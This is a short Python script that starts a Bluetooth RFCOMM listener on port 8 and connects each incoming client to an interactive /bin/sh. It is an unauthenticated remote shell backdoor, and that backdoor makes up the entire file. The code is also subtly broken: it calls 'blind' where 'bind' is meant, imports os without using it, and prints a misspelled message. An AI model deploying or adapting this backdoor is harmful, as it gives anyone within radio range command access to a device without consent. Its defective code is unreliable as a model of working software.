import bluetooth
import os
import subprocess

server_sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)

port = 8

btclient = None

server_sock.blind(("", port))
server_sock.listen(1)

print("Server started... \nAwaiting conenctions...")
while True:
    btclient, addr = server_sock.accept()
    subprocess.call(["/bin/sh", "-i"], stdin=btclient.fileno(), stdout=btclient.fileno(), stderr=btclient.fileno())
    
